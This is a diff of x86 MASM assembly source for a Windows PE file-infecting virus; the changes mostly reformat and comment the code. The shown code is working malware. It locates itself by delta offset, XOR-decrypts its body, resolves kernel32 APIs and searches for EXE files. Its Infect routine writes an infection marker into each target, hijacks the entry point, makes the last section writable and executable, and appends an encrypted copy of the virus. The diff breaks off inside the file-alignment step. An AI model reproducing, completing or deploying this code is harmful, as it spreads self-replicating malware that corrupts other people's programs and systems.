@@ -1,8 +1,12 @@
+;TODO <Copyrights>
+
+;VV_VERSION=1.0
+
 .386
 .model flat, stdcall
 option casemap:none
 
-include \masm32\include\windows.inc;comment
+include \masm32\include\windows.inc
 include \masm32\include\user32.inc
 include \masm32\include\kernel32.inc
 
@@ -11,15 +15,19 @@ includelib \masm32\lib\kernel32.lib
 
 .code
 
-start:
-	call delta
-delta:
+label_start:
+;Calculate base address offset - delta
+	call label_delta
+label_delta:
 	pop edi
-	sub edi,offset delta;delta offset in edi
-	jmp start1
+	sub edi,offset label_delta ;Now edi contains delta
+	
+	jmp label_start1
+	
 ;-----------------------------------------------------------
-;in-WINAPI 
-;address,size,key address,key size
+;Crypt - xors mem block with key
+;in (calling convention: WINAPI)
+;	address,size,key address,key size
 ;-----------------------------------------------------------
 Crypt proc
 	push ebp
@@ -28,190 +36,190 @@ Crypt proc
 	pushad
 	pushfd
 
-	mov esi,dword ptr[ebp+8];address
-mov edx,dword ptr[ebp+0Ch];size
-mov edi,dword ptr[ebp+10h];key address
-mov ebx,dword ptr[ebp+14h];key size
-mov ecx,0
+	mov esi,dword ptr[ebp+8]					;address
+	mov edx,dword ptr[ebp+0Ch]					;size
+	mov edi,dword ptr[ebp+10h]					;key address
+	mov ebx,dword ptr[ebp+14h]					;key size
+	mov ecx,0
+	
 crypt_loop2:
-cmp ecx,edx;cmp size
-jz end_crypt_loop2
+	cmp ecx,edx;cmp size
+	jz end_crypt_loop2
 
-push edx
-mov eax,ecx
-mov edx,0
-div ebx;in edx - eax%keysize
+	push edx
+	mov eax,ecx
+	mov edx,0
+	div ebx;in edx - eax%keysize
 
-mov al,byte ptr [edi+edx]
-mov dl,byte ptr [esi+ecx]
-xor al,dl
-mov byte ptr [esi+ecx],al
+	mov al,byte ptr [edi+edx]
+	mov dl,byte ptr [esi+ecx]
+	xor al,dl
+	mov byte ptr [esi+ecx],al
 
-inc ecx;position 
-pop edx
-jmp crypt_loop2
+	inc ecx;position 
+	pop edx
+	jmp crypt_loop2
 end_crypt_loop2:
 
 	popfd
 	popad
 
-mov esp,ebp
-pop ebp
+	mov esp,ebp
+	pop ebp
 
-push eax;stack clinin
-mov eax,dword ptr [esp+4];ret address
-mov dword ptr [esp+14h],eax
-pop eax
-add esp,10h;esp on ret address
+	push eax;stack clinin
+	mov eax,dword ptr [esp+4];ret address
+	mov dword ptr [esp+14h],eax
+	pop eax
+	add esp,10h;esp on ret address
 
-ret
+	ret
 Crypt endp
+
 ;----------------------------------------------------------------------------------------
-
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-;calling convention:WINAPI                                                                 ;
-;in                                                                                        ;
-;file handle 8,message_address C,message_size 10,key 14,key_size 18                                    ;
-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;in (calling convention: WINAPI)
+;	file handle 8, message_address C, message_size 10, key 14, key_size 18
+;----------------------------------------------------------------------------------------
 FileCrypt proc
-push ebp
-mov ebp,esp
-pushad
-pushfd
+	push ebp
+	mov ebp,esp
+	pushad
+	pushfd
 
-mov eax,dword ptr [ebp+18h];key size
-add eax,4;NumberOfBytesRead
-push eax
-mov eax,LPTR
-push eax
-call [edi+_LocalAlloc]
-push eax;mem ptr in stack
+	mov eax,dword ptr [ebp+18h];key size
+	add eax,4;NumberOfBytesRead
+	push eax
+	mov eax,LPTR
+	push eax
+	call [edi+_LocalAlloc]
+	push eax;mem ptr in stack
 
-mov eax,dword ptr[ebp+10h];
-mov ebx,dword ptr[ebp+18h];key size
-mov edx,0
-div ebx; number of blocks - 1 with key size in eax; amount of bytes of not full block in edx
-mov ecx,eax
-inc ecx;full amount of blocks (all full and 1 not full)
-mov eax, dword ptr[ebp+0Ch];message address
+	mov eax,dword ptr[ebp+10h];
+	mov ebx,dword ptr[ebp+18h];key size
+	mov edx,0
+	div ebx; number of blocks - 1 with key size in eax; amount of bytes of not full block in edx
+	mov ecx,eax
+	inc ecx;full amount of blocks (all full and 1 not full)
+	mov eax, dword ptr[ebp+0Ch];message address
 
-push ecx
-push edx
+	push ecx
+	push edx
 
-push FILE_BEGIN
-push NULL
-push eax
-mov eax,dword ptr [ebp+8];file handle
-push eax
-call [edi+_SetFilePointer];file pointer on message address ; file position in eax
+	push FILE_BEGIN
+	push NULL
+	push eax
+	mov eax,dword ptr [ebp+8];file handle
+	push eax
+	call [edi+_SetFilePointer];file pointer on message address ; file position in eax
 
-pop edx
-pop ecx
+	pop edx
+	pop ecx
 
 filecrypt_loop1:
-cmp ecx,0
-jz end_filecrypt_loop1
-cmp ecx,1
-jnz no_on_1
-mov ebx,edx;size
+	cmp ecx,0
+	jz end_filecrypt_loop1
+	cmp ecx,1
+	jnz no_on_1
+	mov ebx,edx;size
 no_on_1:
-push ecx
-push edx;amount of bytes of not full block in stack
-push eax;message pointer in stack
+	push ecx
+	push edx;amount of bytes of not full block in stack
+	push eax;message pointer in stack
 
-mov eax, dword ptr [esp+0Ch];mem ptr
-add eax,ebx;key size
-push NULL
-push eax
-sub eax, ebx
-push ebx
-push eax
-mov eax,dword ptr [ebp+8];file handle
-push eax
-call [edi+_ReadFile];block of key size in memory
+	mov eax, dword ptr [esp+0Ch];mem ptr
+	add eax,ebx;key size
+	push NULL
+	push eax
+	sub eax, ebx
+	push ebx
+	push eax
+	mov eax,dword ptr [ebp+8];file handle
+	push eax
+	call [edi+_ReadFile];block of key size in memory
 
-mov eax,dword ptr[esp];message pointer
+	mov eax,dword ptr[esp];message pointer
 
-push FILE_BEGIN
-push NULL
-push eax
-mov eax,dword ptr [ebp+8];file handle
-push eax
-call [edi+_SetFilePointer];file pointer returned; position in file in eax
+	push FILE_BEGIN
+	push NULL
+	push eax
+	mov eax,dword ptr [ebp+8];file handle
+	push eax
+	call [edi+_SetFilePointer];file pointer returned; position in file in eax
 
-push ebx;CURRENT key size
-mov eax,dword ptr [ebp+14h];key addr
-push eax
-push ebx;CURRENT key size
-mov eax,dword ptr [esp+18h];mem ptr
-push eax
-call Crypt
-;now in memory crypted block
+	push ebx;CURRENT key size
+	mov eax,dword ptr [ebp+14h];key addr
+	push eax
+	push ebx;CURRENT key size
+	mov eax,dword ptr [esp+18h];mem ptr
+	push eax
+	call Crypt
+	;now in memory crypted block
 
-mov eax,dword ptr[esp+0Ch];mem ptr
-add eax,ebx
-push NULL
-push eax
-sub eax, ebx
-push ebx
-push eax
-mov eax,dword ptr [ebp+8];file handle
-push eax
-call [edi+_WriteFile];writing crypted in file
+	mov eax,dword ptr[esp+0Ch];mem ptr
+	add eax,ebx
+	push NULL
+	push eax
+	sub eax, ebx
+	push ebx
+	push eax
+	mov eax,dword ptr [ebp+8];file handle
+	push eax
+	call [edi+_WriteFile];writing crypted in file
 
-pop eax;message pointer in eax
-add eax,ebx
-pop edx
-pop ecx
-dec ecx
+	pop eax;message pointer in eax
+	add eax,ebx
+	pop edx
+	pop ecx
+	dec ecx
 
-jmp filecrypt_loop1
+	jmp filecrypt_loop1
 end_filecrypt_loop1:
 
-call [edi+_LocalFree]
+	call [edi+_LocalFree]
 
-popfd
-popad
+	popfd
+	popad
 
-mov esp,ebp
-pop ebp
+	mov esp,ebp
+	pop ebp
 
-push eax;stack clinin
-mov eax,dword ptr [esp+4];ret address
-mov dword ptr [esp+18h],eax
-pop eax
-add esp,14h;esp on ret address
+	push eax;stack clinin
+	mov eax,dword ptr [esp+4];ret address
+	mov dword ptr [esp+18h],eax
+	pop eax
+	add esp,14h;esp on ret address
 
-ret
+	ret
 FileCrypt endp
+
 ;-------------------------------------------------------------------------------------------
-start1:
-		push 4;key size
-		mov eax,offset key
-		add eax,edi
-		push eax;key address
-		mov eax,offset ending_crypto
-		sub eax,offset start_crypto
-		push eax;size
-		mov eax,offset start_crypto
-		add eax,edi
-		push eax;address
-	call Crypt;decrypt
+label_start1:
+	push 4													;key size
+	mov eax,offset key
+	add eax,edi
+	push eax												;key address
+	mov eax,offset ending_crypto
+	sub eax,offset start_crypto
+	push eax												;size
+	mov eax,offset start_crypto
+	add eax,edi
+	push eax												;address
+	call Crypt												;decrypt
 
 start_crypto:
 
-	mov esi,dword ptr [esp];esp-return to kernel
+	mov esi,dword ptr [esp]									;esp-return to kernel
 	call GetPEImageBase
 	
 	push esi
-	call GetGetProcAddress; GetProcAddress address in eax
+	call GetGetProcAddress									;GetProcAddress address in eax
 
 	mov dword ptr [edi + offset _GetProcAddress],esi
 
 	mov ebx,offset CreateFileA_
 	add ebx, edi
 	push ebx
-	mov ebx,dword ptr [esp+4];kernel32.dll base
+	mov ebx,dword ptr [esp+4]								;kernel32.dll base
 	push ebx
 	call esi
 	mov dword ptr [edi+offset _CreateFileA],eax
@@ -309,719 +317,717 @@ call SearchEXE
 ;esi: exe ASCIIZ path
 ;---------------------------------------------
 Infect proc
-pushad
-pushfd
-
-
-push NULL
-push FILE_ATTRIBUTE_NORMAL
-push OPEN_EXISTING
-push NULL
-mov eax, FILE_SHARE_READ
-or eax,FILE_SHARE_WRITE
-push eax
-mov eax, GENERIC_READ
-or eax, GENERIC_WRITE
-push eax
-push esi
-call [edi+ offset _CreateFileA]
-
-push eax; file handle in stack
-
-mov eax,8
-push eax
-push LPTR
-call [edi+ offset _LocalAlloc];need to call LocalFree
-
-push eax;memory pointer in stack 
-
-mov eax,dword ptr [esp+4]
-push FILE_BEGIN
-push NULL
-push 3Ch
-push eax
-call [edi+ offset _SetFilePointer];file pointer on e_lfanew
-
-mov eax,dword ptr [esp]
-
-push NULL
-add eax,4
-push eax
-sub eax,4
-push 4
-push eax
-mov eax,dword ptr [esp+14h]
-push eax
-call [edi+ offset _ReadFile];now offset of PE signature in memory
-
-mov eax,dword ptr [esp]
-mov ebx,dword ptr[eax]
-
-push ebx;saving PE signature offset in stack
-
-;********************vv signature*********************************
-push FILE_BEGIN
-push NULL
-add ebx,4Ch;Reserved1 offset
-push ebx
-mov ebx, dword ptr [esp+14h]
-push ebx
-call [edi+ offset _SetFilePointer];now file pointer on Reserved1 field
-
-mov eax,dword ptr[esp+4]
-mov dword ptr[eax],0ABCDDCBAh
-push NULL
-add eax,4
-push eax
-sub eax,4
-push 4
-push eax
-mov eax,dword ptr [esp+18h]
-push eax
-call [edi+ offset _WriteFile];writing signature
-;********************vv signature*********************************
-
-push FILE_BEGIN
-push NULL
-mov eax,[esp+8]
-add eax,6
-push eax
-mov eax, dword ptr [esp+14h]
-push eax
-call [edi+ offset _SetFilePointer];file pointer on NumberOfSections field
-
-push NULL
-mov eax,dword ptr [esp+8]
-add eax,4
-push eax
-sub eax,4
-push 2
-push eax
-mov eax, [esp+18h]
-push eax
-call [edi+ offset _ReadFile]; NumberOfSections in memory
-
-mov eax, dword ptr [esp+4]
-mov ebx,0
-mov bx, word ptr [eax]
-
-push ebx;NumberOfSections in stack
-
-mov eax, dword ptr [esp+4]
-add eax,14h;offset of SizeOfOptionalHeader in eax
-push FILE_BEGIN
-push NULL
-push eax
-mov eax,dword ptr [esp+18h]
-push eax
-call [edi+ offset _SetFilePointer];file pointer on SizeOfOptionalHeader
-
-push NULL
-mov eax,dword ptr [esp+0Ch]
-add eax,4
-push eax
-sub eax,4
-push 2
-push eax
-mov eax, dword ptr [esp+1Ch]
-push eax
-call [edi+ offset _ReadFile];reading SizeOfOptionalHeader
-
-pop ecx;NumberOfSections
-
-call Incubation;finding last section field
-mov ecx,eax
-
-mov eax,0
-loop1:;mul eax,28h
-cmp ecx,0
-jz end_loop1
-add eax,28h
-dec ecx
-jmp loop1
-end_loop1:
-
-mov ebx, dword ptr [esp]
-add eax, ebx;adding PE signature offset
-mov ebx, dword ptr [esp+4];memory ptr
-mov ecx,dword ptr [ebx];SizeOfOptionalHeader
-and ecx,0FFFFh
-add eax, ecx
-add eax,18h;size of PE signature and _IMAGE_FILE_HEADER
-
-push eax;offset of last section field in stack
-
-;**************entry point************************
-add eax, 0Ch;VirtualAddress
-push FILE_BEGIN
-push NULL
-push eax
-mov eax, dword ptr [esp+18h]
-push eax
-call [edi+offset _SetFilePointer];file pointer on VirtualAddress of last section field
-
-mov eax,dword ptr[esp+8]
-push NULL
-add eax,4
-push eax
-sub eax,4
-push 4
-push eax
-mov eax,dword ptr [esp+1Ch]
-push eax
-call [edi+offset _ReadFile];reading VirtualAddress of last section of last section field
-
-mov eax, dword ptr [esp+08h]
-mov ebx,dword ptr [eax]
-
-push ebx;VirtualAddress in stack
-
-push FILE_END
-push NULL
-push 0
-mov eax, dword ptr [esp+1Ch]
-push eax
-call [edi+offset _SetFilePointer];file pointer on 1st byte after end of file
-
-push eax; size of file in stack
-
-mov eax, dword ptr [esp+8];last section 
-add eax,14h;PointerToRawData
-push FILE_BEGIN
-push NULL
-push eax
-mov eax, dword ptr [esp+20h]
-push eax
-call [edi+offset _SetFilePointer];file pointer on PointerToRawData of last section
-
-mov eax,dword ptr[esp+10h]
-push NULL
-add eax,4
-push eax
-sub eax,4
-push 4
-push eax
-mov eax,dword ptr [esp+24h]
-push eax
-call [edi+offset _ReadFile];reading PointerToRawData of last section
-
-mov ebx,dword ptr[esp+10h]
-mov eax, dword ptr [ebx]
-
-pop ebx;size of file
-sub ebx,eax;raw size size of last section + overlay
-
-pop eax;VirtualAddress in eax
-
-add eax,ebx;real entry point in eax
-
-mov ebx,dword ptr [edi+ offset my_entry_point]
-push ebx;my_entry_point in stack
-mov dword ptr [edi+ offset my_entry_point],eax
-
-mov ebx,dword ptr [edi+ offset entry_point]
-push ebx;entry point of parent gen in stack
-mov dword ptr [edi+ offset entry_point],eax
-
-mov eax,dword ptr [esp+0Ch]
-add eax,28h;offset of AddressOfEntryPoint
-push FILE_BEGIN
-push NULL
-push eax
-mov eax, dword ptr [esp+20h]
-push eax
-call [edi+offset _SetFilePointer];file pointer on AddressOfEntryPoint
-
-mov eax,dword ptr[esp+10h]
-push NULL
-add eax,4
-push eax
-sub eax,4
-push 4
-push eax
-mov eax,dword ptr [esp+24h]
-push eax
-call [edi+offset _ReadFile];reading ex entry point
-
-mov eax,dword ptr [esp+10h]
-mov ebx,dword ptr[eax];ex entry point
-mov ecx, [edi+offset entry_point];real entry point
-mov dword ptr [eax+4],ecx
-mov ecx,dword ptr [eax]
-mov [edi+offset entry_point],ecx;ex entry point in entry_point
-
-mov eax,dword ptr [esp+0Ch]
-add eax,28h;offset of AddressOfEntryPoint
-push FILE_BEGIN
-push NULL
-push eax
-mov eax, dword ptr [esp+20h]
-push eax
-call [edi+offset _SetFilePointer];file pointer on AddressOfEntryPoint
-
-mov eax,dword ptr [esp+10h]
-push NULL
-push eax
-add eax,4
-push 4
-push eax
-mov eax,dword ptr [esp+24h]
-push eax
-call [edi+offset _WriteFile]
-;**************entry point************************
-
-;****************************Characteristics********************************
-push FILE_BEGIN
-push NULL
-add eax,24h;Characteristics
-push eax
-mov eax,dword ptr [esp+20h]
-push eax
-call [edi+ offset _SetFilePointer];file pointer on Characteristics
-
-push NULL
-mov eax,dword ptr[esp+14h]
-add eax,4
-push eax
-sub eax,4
-push 4
-push eax
-mov eax,dword ptr[esp+24h]
-push eax
-call [edi+ offset _ReadFile];reading Characteristics 
-
-mov ebx, IMAGE_SCN_MEM_WRITE
-or ebx, IMAGE_SCN_MEM_EXECUTE
-or ebx, IMAGE_SCN_MEM_READ
-or ebx, IMAGE_SCN_CNT_CODE;Characteristics in ebx
-
-mov eax, dword ptr [esp+10h]
-mov ecx, dword ptr [eax]
-or ebx,ecx;final characteristics
-
-mov dword ptr [eax],ebx
-
-mov eax,dword ptr [esp+8]
-push FILE_BEGIN
-push NULL
-add eax,24h;Characteristics
-push eax
-mov eax,dword ptr [esp+20h]
-push eax
-call [edi+ offset _SetFilePointer];file pointer on Characteristics
-
-mov eax, dword ptr [esp+10h]
-
-push NULL
-add eax,4
-push eax
-sub eax,4
-push 4
-push eax
-mov eax,[esp+24h]
-push eax
-call [edi+ offset _WriteFile];writing characteristics
-;***************Characteristics**************************
-
-;*********************Code Injecting*************************
-push FILE_END
-push NULL
-push 0
-mov eax,dword ptr [esp+20h]
-push eax
-call [edi+ _SetFilePointer];file pointer on end of file
-
-mov ecx,offset start_crypto
-sub ecx,offset start; size of decryptor in ecx
-add eax,ecx
-push eax;size of file + size of decryptor in stack
-
-mov eax,offset ending
-sub eax,offset start;size of code in eax
-
-mov ecx, dword ptr [esp+14h]
-add ecx,4
-push NULL
-push ecx
-push eax
-mov eax,offset start
-add eax,edi
-push eax
-mov eax,[esp+28h]
-push eax
-call [edi+ offset _WriteFile];writing code 
-
-;+++++++++++++++++++++++++++++++creating key+++++++++++++++++++++++++++++++++++++++++++++++
-mov eax,dword ptr[esp+0Ch];offset of last section field
-add eax, 14h;PointerToRawData
-
-push FILE_BEGIN
-push NULL
-push eax
-mov eax,dword ptr [esp+24h]
-push eax
-call [edi+ _SetFilePointer];filepointer on PointerToRawData
-
-mov ecx, dword ptr [esp+14h]
-add ecx,4
-push NULL
-push ecx
-sub ecx,4
-push 4
-push ecx
-mov eax,[esp+28h]
-push eax
-call [edi+ offset _ReadFile];reading PointerToRawData 
-
-mov ecx,dword ptr [esp+14h]
-mov eax, dword ptr [ecx];PointerToRawData in eax
-
-push FILE_BEGIN
-push NULL
-push eax
-mov eax,dword ptr [esp+24h]
-push eax
-call [edi+ _SetFilePointer];filepointer on last section
-
-mov ecx, dword ptr [esp+14h]
-add ecx,4
-push NULL
-push ecx
-sub ecx,4
-push 4
-push ecx
-mov eax,[esp+28h]
-push eax
-call [edi+ offset _ReadFile];reading 4 bytes in beginning of last section
-
-mov ecx,dword ptr [esp+14h]
-mov eax, dword ptr [ecx];4 bytes in beginning of last section in eax
-;now key 4 bytes size in eax
-;+++++++++++++++++++++++++++++++creating key+++++++++++++++++++++++++++++++++++++++++++++++
-mov ecx,dword ptr [edi+offset key]
-push ecx;old key in stack
-mov dword ptr [edi+offset key],eax;new key (size: 4)
-
-push 4;key size
-mov eax,offset key
-add eax,edi
-push eax
-mov eax, offset ending_crypto
-sub eax,offset start_crypto;size to crypt
-push eax
-mov eax,dword ptr [esp+10h];size of file + size of decryptor in eax
-push eax
-mov eax,dword ptr [esp+2Ch];file handle
-push eax
-call FileCrypt
-
-mov eax,dword ptr [esp+18h];mem ptr
-push NULL
-push eax
-push 4
-mov eax,offset key
-add eax,edi
-push eax
-mov eax,[esp+2Ch]
-push eax
-call [edi+ offset _WriteFile];writing key
-;***********************Code Injecting**************************
-pop eax;;size of file + size of decryptor in stack
-
-pop eax
-mov dword ptr [edi+offset key],eax;old key ressurection
-
-pop eax
-mov dword ptr [edi+ offset entry_point],eax;parent entry point ressurection
-
-pop eax
-mov dword ptr [edi+ offset my_entry_point],eax;parent my_entry_point ressurection
-
-;************************File Alignment*************************
-mov ebx,offset ending
-sub ebx,offset start; size of code 
-mov ecx,0
+	pushad
+	pushfd
+
+	push NULL
+	push FILE_ATTRIBUTE_NORMAL
+	push OPEN_EXISTING
+	push NULL
+	mov eax, FILE_SHARE_READ
+	or eax,FILE_SHARE_WRITE
+	push eax
+	mov eax, GENERIC_READ
+	or eax, GENERIC_WRITE
+	push eax
+	push esi
+	call [edi+ offset _CreateFileA]
+
+	push eax; file handle in stack
+
+	mov eax,8
+	push eax
+	push LPTR
+	call [edi+ offset _LocalAlloc];need to call LocalFree
+
+	push eax;memory pointer in stack 
+
+	mov eax,dword ptr [esp+4]
+	push FILE_BEGIN
+	push NULL
+	push 3Ch
+	push eax
+	call [edi+ offset _SetFilePointer];file pointer on e_lfanew
+
+	mov eax,dword ptr [esp]
+
+	push NULL
+	add eax,4
+	push eax
+	sub eax,4
+	push 4
+	push eax
+	mov eax,dword ptr [esp+14h]
+	push eax
+	call [edi+ offset _ReadFile];now offset of PE signature in memory
+
+	mov eax,dword ptr [esp]
+	mov ebx,dword ptr[eax]
+
+	push ebx;saving PE signature offset in stack
+
+	;********************vv signature*********************************
+	push FILE_BEGIN
+	push NULL
+	add ebx,4Ch;Reserved1 offset
+	push ebx
+	mov ebx, dword ptr [esp+14h]
+	push ebx
+	call [edi+ offset _SetFilePointer];now file pointer on Reserved1 field
+
+	mov eax,dword ptr[esp+4]
+	mov dword ptr[eax],0ABCDDCBAh
+	push NULL
+	add eax,4
+	push eax
+	sub eax,4
+	push 4
+	push eax
+	mov eax,dword ptr [esp+18h]
+	push eax
+	call [edi+ offset _WriteFile];writing signature
+	;********************vv signature*********************************
+
+	push FILE_BEGIN
+	push NULL
+	mov eax,[esp+8]
+	add eax,6
+	push eax
+	mov eax, dword ptr [esp+14h]
+	push eax
+	call [edi+ offset _SetFilePointer];file pointer on NumberOfSections field
+
+	push NULL
+	mov eax,dword ptr [esp+8]
+	add eax,4
+	push eax
+	sub eax,4
+	push 2
+	push eax
+	mov eax, [esp+18h]
+	push eax
+	call [edi+ offset _ReadFile]; NumberOfSections in memory
+
+	mov eax, dword ptr [esp+4]
+	mov ebx,0
+	mov bx, word ptr [eax]
+
+	push ebx;NumberOfSections in stack
+
+	mov eax, dword ptr [esp+4]
+	add eax,14h;offset of SizeOfOptionalHeader in eax
+	push FILE_BEGIN
+	push NULL
+	push eax
+	mov eax,dword ptr [esp+18h]
+	push eax
+	call [edi+ offset _SetFilePointer];file pointer on SizeOfOptionalHeader
+
+	push NULL
+	mov eax,dword ptr [esp+0Ch]
+	add eax,4
+	push eax
+	sub eax,4
+	push 2
+	push eax
+	mov eax, dword ptr [esp+1Ch]
+	push eax
+	call [edi+ offset _ReadFile];reading SizeOfOptionalHeader
+
+	pop ecx;NumberOfSections
+
+	call Incubation;finding last section field
+	mov ecx,eax
+
+	mov eax,0
+	loop1:;mul eax,28h
+	cmp ecx,0
+	jz end_loop1
+	add eax,28h
+	dec ecx
+	jmp loop1
+	end_loop1:
+
+	mov ebx, dword ptr [esp]
+	add eax, ebx;adding PE signature offset
+	mov ebx, dword ptr [esp+4];memory ptr
+	mov ecx,dword ptr [ebx];SizeOfOptionalHeader
+	and ecx,0FFFFh
+	add eax, ecx
+	add eax,18h;size of PE signature and _IMAGE_FILE_HEADER
+
+	push eax;offset of last section field in stack
+
+	;**************entry point************************
+	add eax, 0Ch;VirtualAddress
+	push FILE_BEGIN
+	push NULL
+	push eax
+	mov eax, dword ptr [esp+18h]
+	push eax
+	call [edi+offset _SetFilePointer];file pointer on VirtualAddress of last section field
+
+	mov eax,dword ptr[esp+8]
+	push NULL
+	add eax,4
+	push eax
+	sub eax,4
+	push 4
+	push eax
+	mov eax,dword ptr [esp+1Ch]
+	push eax
+	call [edi+offset _ReadFile];reading VirtualAddress of last section of last section field
+
+	mov eax, dword ptr [esp+08h]
+	mov ebx,dword ptr [eax]
+
+	push ebx;VirtualAddress in stack
+
+	push FILE_END
+	push NULL
+	push 0
+	mov eax, dword ptr [esp+1Ch]
+	push eax
+	call [edi+offset _SetFilePointer];file pointer on 1st byte after end of file
+
+	push eax; size of file in stack
+
+	mov eax, dword ptr [esp+8];last section 
+	add eax,14h;PointerToRawData
+	push FILE_BEGIN
+	push NULL
+	push eax
+	mov eax, dword ptr [esp+20h]
+	push eax
+	call [edi+offset _SetFilePointer];file pointer on PointerToRawData of last section
+
+	mov eax,dword ptr[esp+10h]
+	push NULL
+	add eax,4
+	push eax
+	sub eax,4
+	push 4
+	push eax
+	mov eax,dword ptr [esp+24h]
+	push eax
+	call [edi+offset _ReadFile];reading PointerToRawData of last section
+
+	mov ebx,dword ptr[esp+10h]
+	mov eax, dword ptr [ebx]
+
+	pop ebx;size of file
+	sub ebx,eax;raw size size of last section + overlay
+
+	pop eax;VirtualAddress in eax
+
+	add eax,ebx;real entry point in eax
+
+	mov ebx,dword ptr [edi+ offset my_entry_point]
+	push ebx;my_entry_point in stack
+	mov dword ptr [edi+ offset my_entry_point],eax
+
+	mov ebx,dword ptr [edi+ offset entry_point]
+	push ebx;entry point of parent gen in stack
+	mov dword ptr [edi+ offset entry_point],eax
+
+	mov eax,dword ptr [esp+0Ch]
+	add eax,28h;offset of AddressOfEntryPoint
+	push FILE_BEGIN
+	push NULL
+	push eax
+	mov eax, dword ptr [esp+20h]
+	push eax
+	call [edi+offset _SetFilePointer];file pointer on AddressOfEntryPoint
+
+	mov eax,dword ptr[esp+10h]
+	push NULL
+	add eax,4
+	push eax
+	sub eax,4
+	push 4
+	push eax
+	mov eax,dword ptr [esp+24h]
+	push eax
+	call [edi+offset _ReadFile];reading ex entry point
+
+	mov eax,dword ptr [esp+10h]
+	mov ebx,dword ptr[eax];ex entry point
+	mov ecx, [edi+offset entry_point];real entry point
+	mov dword ptr [eax+4],ecx
+	mov ecx,dword ptr [eax]
+	mov [edi+offset entry_point],ecx;ex entry point in entry_point
+
+	mov eax,dword ptr [esp+0Ch]
+	add eax,28h;offset of AddressOfEntryPoint
+	push FILE_BEGIN
+	push NULL
+	push eax
+	mov eax, dword ptr [esp+20h]
+	push eax
+	call [edi+offset _SetFilePointer];file pointer on AddressOfEntryPoint
+
+	mov eax,dword ptr [esp+10h]
+	push NULL
+	push eax
+	add eax,4
+	push 4
+	push eax
+	mov eax,dword ptr [esp+24h]
+	push eax
+	call [edi+offset _WriteFile]
+	;**************entry point************************
+
+	;****************************Characteristics********************************
+	push FILE_BEGIN
+	push NULL
+	add eax,24h;Characteristics
+	push eax
+	mov eax,dword ptr [esp+20h]
+	push eax
+	call [edi+ offset _SetFilePointer];file pointer on Characteristics
+
+	push NULL
+	mov eax,dword ptr[esp+14h]
+	add eax,4
+	push eax
+	sub eax,4
+	push 4
+	push eax
+	mov eax,dword ptr[esp+24h]
+	push eax
+	call [edi+ offset _ReadFile];reading Characteristics 
+
+	mov ebx, IMAGE_SCN_MEM_WRITE
+	or ebx, IMAGE_SCN_MEM_EXECUTE
+	or ebx, IMAGE_SCN_MEM_READ
+	or ebx, IMAGE_SCN_CNT_CODE;Characteristics in ebx
+
+	mov eax, dword ptr [esp+10h]
+	mov ecx, dword ptr [eax]
+	or ebx,ecx;final characteristics
+
+	mov dword ptr [eax],ebx
+
+	mov eax,dword ptr [esp+8]
+	push FILE_BEGIN
+	push NULL
+	add eax,24h;Characteristics
+	push eax
+	mov eax,dword ptr [esp+20h]
+	push eax
+	call [edi+ offset _SetFilePointer];file pointer on Characteristics
+
+	mov eax, dword ptr [esp+10h]
+
+	push NULL
+	add eax,4
+	push eax
+	sub eax,4
+	push 4
+	push eax
+	mov eax,[esp+24h]
+	push eax
+	call [edi+ offset _WriteFile];writing characteristics
+	;***************Characteristics**************************
+
+	;*********************Code Injecting*************************
+	push FILE_END
+	push NULL
+	push 0
+	mov eax,dword ptr [esp+20h]
+	push eax
+	call [edi+ _SetFilePointer];file pointer on end of file
+
+	mov ecx,offset start_crypto
+	sub ecx,offset start; size of decryptor in ecx
+	add eax,ecx
+	push eax;size of file + size of decryptor in stack
+
+	mov eax,offset ending
+	sub eax,offset start;size of code in eax
+
+	mov ecx, dword ptr [esp+14h]
+	add ecx,4
+	push NULL
+	push ecx
+	push eax
+	mov eax,offset start
+	add eax,edi
+	push eax
+	mov eax,[esp+28h]
+	push eax
+	call [edi+ offset _WriteFile];writing code 
+
+	;+++++++++++++++++++++++++++++++creating key+++++++++++++++++++++++++++++++++++++++++++++++
+	mov eax,dword ptr[esp+0Ch];offset of last section field
+	add eax, 14h;PointerToRawData
+
+	push FILE_BEGIN
+	push NULL
+	push eax
+	mov eax,dword ptr [esp+24h]
+	push eax
+	call [edi+ _SetFilePointer];filepointer on PointerToRawData
+
+	mov ecx, dword ptr [esp+14h]
+	add ecx,4
+	push NULL
+	push ecx
+	sub ecx,4
+	push 4
+	push ecx
+	mov eax,[esp+28h]
+	push eax
+	call [edi+ offset _ReadFile];reading PointerToRawData 
+
+	mov ecx,dword ptr [esp+14h]
+	mov eax, dword ptr [ecx];PointerToRawData in eax
+
+	push FILE_BEGIN
+	push NULL
+	push eax
+	mov eax,dword ptr [esp+24h]
+	push eax
+	call [edi+ _SetFilePointer];filepointer on last section
+
+	mov ecx, dword ptr [esp+14h]
+	add ecx,4
+	push NULL
+	push ecx
+	sub ecx,4
+	push 4
+	push ecx
+	mov eax,[esp+28h]
+	push eax
+	call [edi+ offset _ReadFile];reading 4 bytes in beginning of last section
+
+	mov ecx,dword ptr [esp+14h]
+	mov eax, dword ptr [ecx];4 bytes in beginning of last section in eax
+	;now key 4 bytes size in eax
+	;+++++++++++++++++++++++++++++++creating key+++++++++++++++++++++++++++++++++++++++++++++++
+	mov ecx,dword ptr [edi+offset key]
+	push ecx;old key in stack
+	mov dword ptr [edi+offset key],eax;new key (size: 4)
+
+	push 4;key size
+	mov eax,offset key
+	add eax,edi
+	push eax
+	mov eax, offset ending_crypto
+	sub eax,offset start_crypto;size to crypt
+	push eax
+	mov eax,dword ptr [esp+10h];size of file + size of decryptor in eax
+	push eax
+	mov eax,dword ptr [esp+2Ch];file handle
+	push eax
+	call FileCrypt
+
+	mov eax,dword ptr [esp+18h];mem ptr
+	push NULL
+	push eax
+	push 4
+	mov eax,offset key
+	add eax,edi
+	push eax
+	mov eax,[esp+2Ch]
+	push eax
+	call [edi+ offset _WriteFile];writing key
+	;***********************Code Injecting**************************
+	pop eax;;size of file + size of decryptor in stack
+
+	pop eax
+	mov dword ptr [edi+offset key],eax;old key ressurection
+
+	pop eax
+	mov dword ptr [edi+ offset entry_point],eax;parent entry point ressurection
+
+	pop eax
+	mov dword ptr [edi+ offset my_entry_point],eax;parent my_entry_point ressurection
+
+	;************************File Alignment*************************
+	mov ebx,offset ending
+	sub ebx,offset start; size of code 
+	mov ecx,0
 file_alignment_label:
